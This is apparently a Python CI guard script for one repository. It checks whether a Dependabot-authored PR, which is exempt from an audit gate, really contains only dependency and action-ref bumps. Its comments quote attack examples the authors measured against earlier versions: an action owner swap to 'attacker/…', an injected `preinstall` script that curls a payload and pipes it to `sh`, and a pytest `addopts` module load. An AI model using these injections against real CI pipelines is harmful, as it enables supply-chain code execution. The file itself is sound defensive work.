#!/usr/bin/env python3
"""A PR exempted from the audit gate BY AUTHOR must be manifest-only BY CONTENT.

`audit-gate.yml` skips "Require recorded audit evidence" when the PR author is
`dependabot[bot]`. That exemption is justified by CONTENT -- "there are no
findings to record about a lockfile bump" -- and keyed on AUTHOR, and the gap
between those two is reachable:

**A maintainer can push commits to a Dependabot branch.** The routine case is a
bump that breaks something and a human fixing it in place. `pull_request.user.login`
stays `dependabot[bot]`, so the exemption follows the branch rather than the
content, and arbitrary human-authored code -- in `app/ai/`, in a scoring engine,
anywhere -- would merge with the required audit check green and no audit block
anywhere in the record. That is the class #93/#94/#95 record putting a
client-facing fabricated gap on `main`.

So this closes it from the other side. It runs ONLY for the exempted author, and
it fails when that PR touches anything outside the manifest and lockfile set. A
human pushing code onto a bot branch is then blocked -- loudly, by name, with the
offending paths printed -- instead of inheriting an exemption written for a
version bump.

## Why a separate step rather than folding it into the condition

`check_audit_evidence.py` stays author-blind: it is handed a changed-file list
and a body, and giving it an identity would turn a text checker into an
authorisation checker. This script is the opposite -- deciding an exemption is
its whole job, so it is the right place for an author to appear.

Keeping them separate also keeps the two failures distinguishable. "You did not
record an audit" and "this bot PR is not a version bump any more" are different
sentences, and a reader needs to know which one they are looking at.

## Two allow-lists, because two file classes carry different authority

`.github/dependabot.yml` declares pip, npm and github-actions.

**Manifests and lockfiles are judged by PATH.** A dependency manifest has no
authority over anything except which versions install, so matching the path is
enough.

**`.github/` files are judged by CONTENT**, and the first version of this file
got that wrong -- it put `.github/workflows/*.yml` on the path allow-list, which
meant a PR authored as `dependabot[bot]` could rewrite `audit-gate.yml`, delete
the very step this exemption lives in, and pass. In the file class that controls
every other gate. See `GITHUB_GLOBS`.

DELIBERATELY NOT DERIVED from `.github/dependabot.yml`. That file names
ecosystems and directories, not the files an updater writes, so deriving the
path set from it would mean encoding Dependabot's internal behaviour -- a
synchronisation with something this repo does not control, which is worse than a
list whose additions are visible in review.

## HOW THIS WAS VALIDATED, and how the first attempt validated the wrong half

The first run checked all four open bot PRs (#465-#468) and reported every one
clean. That establishes the allow-list is WIDE ENOUGH. It says nothing about
whether it is NARROW ENOUGH -- and #465 passed *precisely because* workflows were
permitted, so the run meant to validate the guard exercised the dangerous case
and recorded it as a pass.

**An allow-list validated only against benign traffic is certified for coverage,
never for restriction.** Same defect as sampling mutations only from inside the
region the tests already cover: both produce a confident green from a population
that could not have gone red.

So the validation now has both halves, and the second is the one that matters:

  * all four real PRs, with their real diffs -> exit 0;
  * #465's real diff with a single `continue-on-error: true` planted into it
    -> exit 1, naming the line.

## Silent-success branches, enumerated first

  * an EMPTY changed-file list -> exit 2. An empty diff on a bot PR is a
    checkout that did not resolve, and reading it as "no offending paths" is the
    `is_code_change([])` shape.
  * a MISSING or unreadable changed-file list -> exit 2.
  * a `.github/` path changed and NO `--diff` given -> exit 2. A path match
    cannot decide that file, and treating the match as approval is the hole
    above.
  * a `.github/` path in the changed-file list but ABSENT from the diff -> exit
    2. The two inputs disagree, and the direction that matters is that the file
    would otherwise be approved unexamined.
  * an author that is NOT the exempted bot -> exit 0 immediately, printing that
    it did not apply. A human PR is not this script's business, and it must not
    be able to fail one.
  * no `--author` given at all -> exit 2, never 0. A missing author would
    otherwise take the same path as a human author and report clean over a bot
    PR nobody checked.

Exit codes follow D-090: 0 clean, 1 a real violation, 2 could not look.
"""

from __future__ import annotations

import re
import sys
from fnmatch import fnmatch
from pathlib import Path

EXIT_OK = 0
EXIT_VIOLATION = 1
EXIT_COULD_NOT_LOOK = 2

#: The author the audit gate exempts. One login, matching the `if:` in
#: `audit-gate.yml` -- if these two ever disagree the exemption is unguarded,
#: which is why `test_bot_pr_manifest_guard.py` asserts they are the same string.
EXEMPTED_AUTHOR = "dependabot[bot]"

#: Manifests and lockfiles for the ecosystems `.github/dependabot.yml` declares.
#: A path match alone is enough here: a dependency manifest has no authority over
#: anything except which versions install.
MANIFEST_GLOBS = (
    # pip: `pyproject.toml` and `requirements*.txt` are NOT here. They moved to
    # `PYTHON_MANIFEST_GLOBS`, content-judged, for the same reason
    # `package.json` did -- see the note there. Leaving them path-approved was
    # the twin this branch failed to sweep when it fixed `package.json`.
    "**/poetry.lock",
    "**/uv.lock",
    # npm / pnpm
    # `package.json` is NOT here. It moved to `PACKAGE_JSON_GLOBS`, which is
    # content-judged, because its `scripts` block is executed by `ci.yml`.
    # Leaving it path-approved is the hole measured on 2026-09-22.
    "**/package-lock.json",
    "package-lock.json",
    "**/pnpm-lock.yaml",
    "pnpm-lock.yaml",
    "pnpm-workspace.yaml",
    "**/yarn.lock",
)

#: `.github/` IS NOT ON THE PATH ALLOW-LIST, and the first version of this file
#: put it there. That was a hole in the file class that controls every other gate.
#:
#: `.github/workflows/*.yml` was permitted because the github-actions updater
#: legitimately rewrites workflows to bump `uses:` refs -- #465 does exactly
#: that. But a path match cannot tell a ref bump from a rewrite of the audit
#: gate itself, so a PR authored as `dependabot[bot]` could have edited
#: `audit-gate.yml` -- removing the very step this exemption lives in -- and
#: passed the manifest-only check. Anyone with write access can push to a
#: Dependabot branch, and zero reviews are required. (`enforce_admins` was
#: false then and is true since 2026-09-25, #595. That does not close this
#: hole: the attack goes through GREEN checks, because the skipped audit step
#: is what would have been red, so there is nothing for an admin to bypass.)
#:
#: REMOVING THE GLOB WAS THE WRONG FIX because it re-breaks #465. So `.github/`
#: is judged by CONTENT: every added or removed line in such a file must be a
#: `uses: <owner>/<repo>@<ref>` bump. Anything else from a bot author is a
#: violation.
#:
#: THE SENTENCE THAT STOOD HERE OVER-CLAIMED: "Measured on #465 ... so the real
#: traffic passes and the dangerous edit does not." The #465 measurement
#: establishes the first half only. The dangerous edit was NOT measured, and
#: three of them passed -- an owner swap, a lone added `uses:` step, and a
#: `package.json` script injection, all exit 0 until 2026-09-23.
#:
#: What is measured now, both directions, with the attacks named: see the
#: six-probe table in `.github/workflows/audit-gate.yml` beside this step, and
#: `tests/unit/test_bot_pr_manifest_guard.py`, where each attack has a test that
#: asserts exit 1 rather than a prose claim that it would.
GITHUB_GLOBS = (
    ".github/workflows/*.yml",
    ".github/workflows/*.yaml",
    ".github/actions/**",
)

#: A `uses:` line, with or without the leading list dash. Anchored on the owner
#: and repo so a bare `uses: ./local-action` does not qualify: a local action is
#: in-repo code, and pointing a workflow at a different one is not a version bump.
_USES_LINE = re.compile(
    r"^(?P<sign>[-+])\s*(?:-\s*)?uses:\s*"
    r"(?P<action>[A-Za-z0-9_.-]+/[A-Za-z0-9_./-]+)"
    r"@(?P<ref>[^\s#]+)"
    # A trailing YAML comment is permitted because Dependabot writes
    # `uses: owner/repo@<sha> # v4.1.1` whenever a workflow pins by SHA. The
    # comment is inert to the runner. This repo pins by tag today, so the branch
    # is unexercised here and is allowed rather than left to fail closed on the
    # first repo that pins by digest.
    r"(?:\s+#.*)?\s*$"
)

#: Kept as the SYMPTOM a reader arrives with, and it is the defect, not a helper.
#:
#: `^[-+]\s*(?:-\s*)?uses:\s*<owner>/<repo>@\S+\s*$`
#:
#: That is the pattern this guard shipped with, and **it never checked that
#: anything was BUMPED.** It matched a line SHAPE, so both of these passed as
#: "every changed line is a `uses:` bump", measured 2026-09-22 with exit 0:
#:
#:     -      - uses: gitleaks/gitleaks-action@v3
#:     +      - uses: attacker/gitleaks-action@v3
#:
#:     +      - uses: attacker/action@v1        (a lone addition, no removal)
#:
#: The first swaps the OWNER of an action that runs in the job holding
#: `pull-requests: write`; the second adds a whole step. Dependabot gets a
#: read-only token while its PR is open, so the escalation is that the line
#: MERGES, after which every human-triggered run executes it with the full token.
#:
#: **A bump is a PAIR**: the same `owner/repo` removed and added, with different
#: refs. That is what `non_bump_lines` now requires, and it is a property of the
#: whole hunk rather than of one line -- which is why no single-line regex could
#: have expressed it.
_BUMP_IS_A_PAIR_NOT_A_LINE_SHAPE = None

#: Unified-diff file headers. `b/` is the post-image path, which is what a
#: changed-file list names.
_DIFF_FILE = re.compile(r"^diff --git a/(?P<a>\S+) b/(?P<b>\S+)$")


#: `package.json` files, which are CONTENT-JUDGED for the same reason `.github/`
#: files are -- and the first version of this guard judged them by PATH under the
#: claim that "a dependency manifest has no authority over anything except which
#: versions install, so matching the path is enough."
#:
#: **That claim is false against `ci.yml`**, which runs `pnpm format:check`,
#: `pnpm -F web lint`, `typecheck`, `test` and `build` -- every one of them a
#: SCRIPT defined in a `package.json`. Measured 2026-09-22: a changed-file list of
#: `apps/web/package.json` + `pnpm-lock.yaml` under the bot author returned exit 0
#: with "clean -- 2 manifest/lockfile path(s)", so one commit on a Dependabot
#: branch turning `"build": "next build"` into `"next build && <anything>"` merges
#: with the audit check green.
#:
#: `dependabot.yml`'s npm entry is `directory: "/"`, so these are routine traffic
#: and cannot simply be removed from the allow-list.
PACKAGE_JSON_GLOBS = ("**/package.json", "package.json")

#: Python manifests, content-judged for the SAME reason `package.json` is.
#:
#: **THIS IS THE TWIN THE `package.json` FIX DID NOT SWEEP.** That round removed
#: `package.json` from path approval because `ci.yml` executes its scripts, and
#: left `pyproject.toml` under the identical sentence -- "a dependency manifest
#: has no authority over anything except which versions install" -- which is
#: false of it in the same way. `CLAUDE.md`: a defect found in one place exists
#: in its twins until you have checked, and the sweep stopped at the one file the
#: review named.
#:
#: The root `pyproject.toml` in this repo holds `[tool.ruff] extend-exclude`,
#: `[tool.ruff.lint] select`/`ignore`, `[tool.black]`, `[tool.bandit] skips` and
#: `[tool.pytest.ini_options] addopts`. CI's `ruff check`, `black --check`,
#: `bandit -q -c pyproject.toml` and pytest all read it. `addopts = "-ra -q -p
#: <module>"` executes an arbitrary installed module at pytest startup; widening
#: `extend-exclude` or `skips` disables a lint or security gate silently.
#: Measured 2026-09-23: a changed-file list of `apps/api/pyproject.toml` alone,
#: under the bot author, exited 0 with no `--diff` required at all.
#:
#: pip IS a declared ecosystem and #466/#467 touch `apps/api/pyproject.toml`, so
#: this is live traffic rather than a hypothetical.
PYTHON_MANIFEST_GLOBS = (
    "**/pyproject.toml",
    "pyproject.toml",
    "**/requirements*.txt",
    "requirements*.txt",
)

#: A dependency line in a Python manifest.
#:
#: TOML and requirements files are judged by SHAPE rather than parsed, and the
#: shape admitted is deliberately narrow: an array element that is a bare quoted
#: string (`    "anthropic>=0.40,<2",`), or a requirements line that begins with a
#: distribution name. Everything else -- a `key = value` assignment, a `[table]`
#: header, an array opener, a `--index-url` or `-e git+...` line -- is REPORTED.
#:
#: `addopts = "-ra -q"` does not match, because the assignment puts `addopts = `
#: before the quote. That is the whole point: the dangerous lines in these files
#: are assignments, and the safe ones are array elements.
#:
#: A false failure here costs a human review of a bot PR. A false pass costs
#: arbitrary code execution in CI, so the asymmetry decides the direction.
_PY_ARRAY_ELEMENT = re.compile(r'^[-+][ \t]*"[^"]*"[ \t]*,?[ \t]*$')
_PY_REQUIREMENT = re.compile(r"^[-+][ \t]*[A-Za-z0-9][A-Za-z0-9._-]*[ \t]*[<>=!~\[].*$")


def non_dependency_lines(path: str, lines: list[str]) -> list[str]:
    """Changed lines in a Python manifest that are not dependency declarations.

    THE RULE IS PER FORMAT, and combining them was a measured hole. The first
    version accepted a line matching EITHER pattern, and `_PY_REQUIREMENT` allows
    `=` as the comparison operator -- so `addopts = "-ra -q -p evil_module"` in a
    TOML file matched the REQUIREMENTS pattern (`addopts` reads as a distribution
    name, ` = ` as an operator) and passed at exit 0. A requirements line and a
    TOML assignment are the same shape under one combined rule.

    So: a `.toml` file admits only bare array elements, and a requirements file
    admits only requirement lines. A TOML assignment is not an array element and
    is reported, which is the whole point -- the dangerous lines in `pyproject.toml`
    are assignments (`addopts`, `extend-exclude`, `skips`, `select`) and the safe
    ones are array elements.
    """
    pattern = _PY_ARRAY_ELEMENT if path.endswith(".toml") else _PY_REQUIREMENT
    return [ln for ln in lines if not pattern.match(ln)]


#: A JSON string VALUE that is a dependency specifier rather than a command.
#:
#: AN ALLOW-LIST ON THE VALUE, not a denylist on dangerous characters. A denylist
#: is certified for the inputs its author imagined; this admits the shape
#: Dependabot actually writes and refuses everything else, so an unanticipated
#: value fails CLOSED to a human review rather than open.
#:
#: Covered: `1.2.3`, `^1.2.3`, `~1.2`, `>=1.2.3`, `v1.2.3`, `1.2.3-rc.1`,
#: `1.2.x`, `*`, `latest`, and the `workspace:` / `catalog:` / `npm:` protocols
#: pnpm uses. NOT covered, deliberately: `file:` and `link:` (a local path is not
#: a version), and anything with whitespace, so a compound range like `>=1 <2`
#: comes back to a human. That is a known false positive in the safe direction.
#:
#: **THE PROTOCOL TAILS WERE `[^\s\"]*` AND THAT WAS A DENYLIST WEARING THIS
#: DOCSTRING'S CLOTHES.** Everything except whitespace and a quote is still `;`
#: `|` `&` `$` `(` `)` and a backtick. Measured 2026-09-23, exit 0 on a bot PR:
#:
#:     +    "preinstall": "npm:;curl$IFShttp://x|sh",
#:
#: One ADDED line -- JSON permits inserting a pair mid-object, so no neighbour
#: and no comma edit is involved -- and `ci.yml` runs `pnpm install
#: --frozen-lockfile`, which runs the root `preinstall`.
#:
#: The sentence claiming safety was false in its own terms: "anything with
#: whitespace ... is the shape a command takes" assumes a command needs a space,
#: and `$IFS` is why it does not. The tails are now bounded to a specifier
#: charset, which is what the word allow-list was already claiming.
#: The characters a dependency specifier tail may contain. No `;`, `|`, `&`,
#: `$`, `(`, `)`, backtick, `:` or whitespace -- so a protocol prefix cannot be
#: used as a doorway to arbitrary text the way `[^\s\"]*` allowed.
_SPEC_TAIL = r"[A-Za-z0-9._~^*+@/-]*"

_SPECIFIER = re.compile(
    "^(?:"
    r"[\^~]?(?:>=?|<=?|=)?v?\d[\w.\-+]*"
    r"|\*|latest"
    f"|workspace:{_SPEC_TAIL}"
    f"|catalog:{_SPEC_TAIL}"
    f"|npm:{_SPEC_TAIL}"
    ")$"
)

#: A changed line in a `package.json`: `"key": "value"`, with an optional comma.
_JSON_PAIR = re.compile(r'^[-+]\s*"(?P<key>[^"]+)"\s*:\s*"(?P<value>[^"]*)"\s*,?\s*$')


def non_specifier_lines(lines: list[str]) -> list[str]:
    """Changed `package.json` lines whose value is not a dependency specifier.

    A structural line (`{`, `}`, `"dependencies": {`) has no string value and is
    REPORTED rather than ignored: Dependabot does not restructure a manifest, so
    a changed structural line means something else edited the file.
    """
    bad: list[str] = []
    for ln in lines:
        m = _JSON_PAIR.match(ln)
        if m is None or not _SPECIFIER.match(m.group("value")):
            bad.append(ln)
    return bad


def offending_paths(changed: list[str]) -> list[str]:
    """Paths a version bump has no business touching at all."""
    allowed = MANIFEST_GLOBS + GITHUB_GLOBS + PACKAGE_JSON_GLOBS + PYTHON_MANIFEST_GLOBS
    return sorted(p for p in changed if not any(fnmatch(p, g) for g in allowed))


def changed_lines_by_file(diff: str) -> dict[str, list[str]]:
    """Added and removed lines, per post-image path, from a unified diff.

    `+++`/`---` headers are excluded -- they start with the same character as a
    content line and counting them would make every changed file look like it
    carries a non-bump line.
    """
    out: dict[str, list[str]] = {}
    current: str | None = None
    for line in diff.splitlines():
        header = _DIFF_FILE.match(line)
        if header:
            current = header.group("b")
            out.setdefault(current, [])
            continue
        if current is None:
            continue
        if line.startswith(("+++", "---")):
            continue
        if line.startswith(("+", "-")):
            out[current].append(line)
    return out


def non_bump_lines(path: str, lines: list[str]) -> list[str]:
    """Changed lines in a `.github/` file that are not part of a `uses:` ref bump.

    A REF BUMP IS A PAIR, not a line shape: the same `owner/repo` must appear
    both removed and added, with a different ref on each side. Anything else is
    reported -- an owner swap, a lone added step, a removal with no replacement,
    or a `uses:` line whose ref did not change.

    `path` is unused and kept in the signature deliberately: every caller has it,
    and a future rule that treats `.github/actions/**` differently from
    `.github/workflows/*.yml` should not have to change the call sites.
    """
    del path  # see the docstring
    parsed: list[tuple[str, str, str, str]] = []  # (sign, action, ref, raw)
    unparsed: list[str] = []
    for ln in lines:
        m = _USES_LINE.match(ln)
        if m is None:
            unparsed.append(ln)
        else:
            parsed.append((m.group("sign"), m.group("action"), m.group("ref"), ln))

    # COUNTS, not just presence. The first version asked only "does the action
    # appear on the other side, with some other ref", which is set
    # non-emptiness rather than a pairing -- so a legitimate bump could CARRY an
    # extra added step for the same action. Measured 2026-09-23, exit 0:
    #
    #     -      - uses: actions/checkout@v4
    #     +      - uses: actions/checkout@v5
    #     +      - uses: actions/checkout@<40-hex-sha>
    #
    # Every line passed: the removal saw `{v5, <sha>}` (non-empty, not `{v4}`),
    # and each addition saw `{v4}`. A whole extra step, on exactly the traffic
    # the exemption exists for -- #465 bumps `actions/checkout` across three
    # workflow files. `owner/repo@<sha>` resolves against the upstream object
    # store, which includes unmerged fork-PR commits.
    #
    # A bump is ONE removal answered by ONE addition. So the counts per action
    # must match on both sides, and the ref sets must differ.
    counts: dict[tuple[str, str], int] = {}
    refs: dict[tuple[str, str], set[str]] = {}
    for sign, action, ref, _raw in parsed:
        counts[(sign, action)] = counts.get((sign, action), 0) + 1
        refs.setdefault((sign, action), set()).add(ref)

    bad = list(unparsed)
    for _sign, action, _ref, raw in parsed:
        removed = counts.get(("-", action), 0)
        added = counts.get(("+", action), 0)
        if removed != added:
            # Unbalanced: a lone addition (a whole new step), a removal with no
            # replacement, or a bump carrying an extra. An owner swap lands here
            # TWICE, once per side, which is what makes the message name both
            # halves of the swap.
            bad.append(raw)
        elif refs.get(("-", action)) == refs.get(("+", action)):
            # Balanced and identical: the line moved or its indentation changed,
            # but no version changed. Not a bump, so not covered -- and a step
            # RELOCATED into a job with a wider token is exactly that shape.
            bad.append(raw)
    return bad


def main(argv: list[str]) -> int:
    author: str | None = None
    changed_path: str | None = None
    diff_path: str | None = None
    args = argv[1:]
    index = 0
    while index < len(args):
        if args[index] == "--author" and index + 1 < len(args):
            author = args[index + 1]
            index += 2
        elif args[index] == "--changed-files" and index + 1 < len(args):
            changed_path = args[index + 1]
            index += 2
        elif args[index] == "--diff" and index + 1 < len(args):
            diff_path = args[index + 1]
            index += 2
        else:
            print(
                f"check-bot-pr-manifest-only: unknown argument {args[index]!r}.\n"
                "  Usage: --author <login> --changed-files <file> [--diff <file>]\n"
                "  `--diff` is REQUIRED when the PR touches `.github/`; see the\n"
                "  module docstring for why a path match is not enough there.\n"
                "  Refusing to report on input it could not parse: an ignored\n"
                "  flag is how a gate reports clean having read nothing (#343).",
                file=sys.stderr,
            )
            return EXIT_COULD_NOT_LOOK

    # A MISSING author is exit 2, never the human path. Falling through to
    # "not the exempted bot, nothing to do" would report clean over a bot PR
    # nobody checked -- the could-not-look branch wearing the clean one's
    # clothes, which is the whole defect this repo's exit-2 convention exists
    # for.
    if author is None:
        print(
            "check-bot-pr-manifest-only: no --author given.\n"
            "  Exit 2, not 0. Without an author this cannot tell an exempted\n"
            "  bot PR from a human one, and the human path exits 0.",
            file=sys.stderr,
        )
        return EXIT_COULD_NOT_LOOK

    if author != EXEMPTED_AUTHOR:
        print(
            f"check-bot-pr-manifest-only: not applicable -- author is {author!r}, "
            f"not {EXEMPTED_AUTHOR!r}. A human PR keeps the audit requirement and "
            f"is not this check's business."
        )
        return EXIT_OK

    if changed_path is None:
        print(
            "check-bot-pr-manifest-only: --changed-files is required.",
            file=sys.stderr,
        )
        return EXIT_COULD_NOT_LOOK

    try:
        raw = Path(changed_path).read_text(encoding="utf-8")
    except (OSError, UnicodeDecodeError) as exc:
        print(
            f"check-bot-pr-manifest-only: could not read {changed_path} ({exc}).\n"
            "  Exit 2, not a pass.",
            file=sys.stderr,
        )
        return EXIT_COULD_NOT_LOOK

    changed = [line.strip() for line in raw.splitlines() if line.strip()]
    if not changed:
        print(
            "check-bot-pr-manifest-only: the changed-file list is EMPTY on a bot PR.\n"
            "  A PR changes something, so this is a diff that did not resolve --\n"
            "  and reading it as 'no offending paths' would exempt a PR nobody\n"
            "  looked at. See check_audit_evidence.py's is_code_change([]).",
            file=sys.stderr,
        )
        return EXIT_COULD_NOT_LOOK

    bad = offending_paths(changed)
    if bad:
        print(
            f"check-bot-pr-manifest-only: FAILED -- this PR is authored by "
            f"{EXEMPTED_AUTHOR} and is exempt from the audit gate, but it touches "
            f"{len(bad)} path(s) outside the manifest and lockfile set:",
            file=sys.stderr,
        )
        for path in bad:
            print(f"    {path}", file=sys.stderr)
        print(
            "\n  The audit exemption is justified by CONTENT -- there are no\n"
            "  adversarial findings to record about a version bump -- and keyed\n"
            "  on AUTHOR. A human pushing commits onto a Dependabot branch keeps\n"
            "  that author, so without this check arbitrary code would merge with\n"
            "  the required audit check green and no audit block anywhere.\n"
            "\n"
            "  If these paths belong here, the PR is no longer a version bump:\n"
            "  open it under a human author and record an audit.",
            file=sys.stderr,
        )
        return EXIT_VIOLATION

    # TWO CONTENT-JUDGED CLASSES, and they share one `--diff` read.
    #
    # `.github/` files: a path match cannot tell a `uses:` ref bump from a rewrite
    # of the audit gate this exemption lives in.
    #
    # `package.json` files: a path match cannot tell a dependency version from a
    # `scripts` entry, and `ci.yml` executes the scripts.
    github_paths = [p for p in changed if any(fnmatch(p, g) for g in GITHUB_GLOBS)]
    pkg_paths = [p for p in changed if any(fnmatch(p, g) for g in PACKAGE_JSON_GLOBS)]
    py_paths = [p for p in changed if any(fnmatch(p, g) for g in PYTHON_MANIFEST_GLOBS)]
    content_paths = github_paths + pkg_paths + py_paths
    if content_paths:
        if diff_path is None:
            print(
                f"check-bot-pr-manifest-only: this PR touches {len(content_paths)} "
                f"content-judged file(s) "
                f"({len(github_paths)} under `.github/`, {len(pkg_paths)} "
                f"`package.json`, {len(py_paths)} Python manifest) and no "
                f"--diff was given.\n"
                "  Exit 2, not a pass. Those files are permitted only when every\n"
                "  changed line is a `uses:` ref bump, or a dependency specifier,\n"
                "  and neither can be decided from a file list. Reading the path\n"
                "  match alone as approval is the hole this check exists to close.",
                file=sys.stderr,
            )
            return EXIT_COULD_NOT_LOOK
        try:
            diff_text = Path(diff_path).read_text(encoding="utf-8")
        except (OSError, UnicodeDecodeError) as exc:
            print(
                f"check-bot-pr-manifest-only: could not read {diff_path} ({exc}).\n"
                "  Exit 2, not a pass.",
                file=sys.stderr,
            )
            return EXIT_COULD_NOT_LOOK

        per_file = changed_lines_by_file(diff_text)
        violations: list[tuple[str, list[str]]] = []
        for path in content_paths:
            if path not in per_file:
                print(
                    f"check-bot-pr-manifest-only: {path} is in the changed-file "
                    f"list and NOT in the diff.\n"
                    "  Exit 2. The two inputs disagree, so neither can be trusted\n"
                    "  about this file -- and the direction that matters is that a\n"
                    "  `.github/` change would otherwise be approved unexamined.",
                    file=sys.stderr,
                )
                return EXIT_COULD_NOT_LOOK
            # A ZERO-LINE DIFF IS A COULD-NOT-LOOK, NOT A PASS. A rename, a
            # mode change, a binary file or a new empty file produces a `diff
            # --git` header and no `+`/`-` content lines, so every content rule
            # below is vacuously satisfied and the run prints "every changed line
            # is a `uses:` bump" having examined ZERO lines. That is
            # `CLAUDE.md`'s "A SELECTOR THAT SELECTS NOTHING PASSES", and the
            # remedy there is to make the count part of the result.
            if not per_file[path]:
                print(
                    f"check-bot-pr-manifest-only: {path} appears in the diff with "
                    f"NO changed content lines.\n"
                    "  Exit 2. A rename, a mode change, a binary file or an empty\n"
                    "  new file reaches this branch, and a content rule over zero\n"
                    "  lines is satisfied without looking at anything. Renaming a\n"
                    "  workflow changes which workflows exist, so this is not a\n"
                    "  thing to wave through.",
                    file=sys.stderr,
                )
                return EXIT_COULD_NOT_LOOK
            if path in pkg_paths:
                extra = non_specifier_lines(per_file[path])
            elif path in py_paths:
                extra = non_dependency_lines(path, per_file[path])
            else:
                extra = non_bump_lines(path, per_file[path])
            if extra:
                violations.append((path, extra))

        if violations:
            # PER CLASS, because one line covering two causes tells a reader that
            # a `package.json` script change is `.github/` content and sends them
            # to read the wrong file. `CLAUDE.md`: a guard's message must name the
            # CAUSE, not the check, and this is the only time it is read.
            bad_wf = [v for v in violations if v[0] in github_paths]
            bad_pkg = [v for v in violations if v[0] in pkg_paths]
            bad_py = [v for v in violations if v[0] in py_paths]
            what = []
            if bad_wf:
                what.append("`.github/` content that is not a `uses:` ref bump PAIR")
            if bad_pkg:
                what.append("a `package.json` line that is not a dependency specifier")
            if bad_py:
                what.append("a Python manifest line that is not a dependency declaration")
            print(
                "check-bot-pr-manifest-only: FAILED -- this bot PR changes "
                + " and ".join(what)
                + ":",
                file=sys.stderr,
            )
            for path, lines in violations:
                print(f"    {path}", file=sys.stderr)
                for line in lines[:6]:
                    print(f"        {line}", file=sys.stderr)
                if len(lines) > 6:
                    print(f"        ... and {len(lines) - 6} more", file=sys.stderr)
            if bad_wf:
                print(
                    "\n  A workflow file is permitted on an audit-exempt PR ONLY for a\n"
                    "  ref bump of an action -- the SAME `owner/repo` removed and\n"
                    "  added with a different ref, which is what the github-actions\n"
                    "  updater does. An owner swap and a lone added step both match\n"
                    "  the line SHAPE and are not bumps; that was the hole. Anything\n"
                    "  else here is a change to the machinery enforcing every other\n"
                    "  gate -- including the audit step this PR is exempt from.",
                    file=sys.stderr,
                )
            if bad_pkg:
                print(
                    "\n  A `package.json` is permitted on an audit-exempt PR ONLY for a\n"
                    "  dependency VERSION change. Its `scripts` block is executed by\n"
                    "  `ci.yml` (`pnpm format:check`, `pnpm -F web lint`, `typecheck`,\n"
                    "  `test`, `build`), so a script edit runs arbitrary code in CI --\n"
                    "  which a path match cannot distinguish from a version bump.\n"
                    "  A compound range with a space (`>=1 <2`) also lands here: that\n"
                    "  is a known false positive and the safe direction.",
                    file=sys.stderr,
                )
            return EXIT_VIOLATION

    # THE MESSAGE STATES ITS BOUND PER CLASS, because "N manifest/lockfile
    # path(s)" over a set that silently included `package.json` is what made the
    # path-approval hole readable as a clean result.
    manifests = len(changed) - len(content_paths)
    parts = [f"{manifests} path-approved manifest/lockfile path(s)"]
    if github_paths:
        parts.append(
            f"{len(github_paths)} `.github/` file(s) whose every changed line is "
            f"one half of a `uses:` ref bump PAIR"
        )
    if pkg_paths:
        parts.append(
            f"{len(pkg_paths)} `package.json` file(s) whose every changed line "
            f"sets a dependency specifier rather than a script"
        )
    if py_paths:
        parts.append(
            f"{len(py_paths)} Python manifest(s) whose every changed line "
            f"declares a dependency rather than a tool setting"
        )
    detail = ", ".join(parts)
    print(
        f"check-bot-pr-manifest-only: clean -- {detail}, so the audit exemption "
        f"still describes what this PR does."
    )
    return EXIT_OK


if __name__ == "__main__":
    # A crash must NOT share an exit code with "violations found". Python exits 1
    # on an unhandled exception, which is this gate's "found something" code, so
    # an uncaught error would read as a verdict it never reached.
    #
    # `BaseException` with both propagating cases NAMED rather than the
    # equivalent `except Exception`: a handler that says out loud what it
    # declines to swallow does not rely on the reader knowing the inheritance
    # tree. `SystemExit` is somebody's deliberate exit code. `KeyboardInterrupt`
    # is an operator who knows exactly what happened and is owed 130, not
    # "could not look".
    try:
        raise SystemExit(main(sys.argv))
    except (SystemExit, KeyboardInterrupt):
        raise
    except BaseException as exc:  # noqa: BLE001 - deliberate: crash != verdict
        nl = chr(10)
        sys.stderr.write(f"check-bot-pr-manifest-only: CRASHED: {type(exc).__name__}: {exc}{nl}")
        sys.stderr.write(f"A crash is not a clean report and not a violation (D-090).{nl}")
        raise SystemExit(EXIT_COULD_NOT_LOOK) from exc
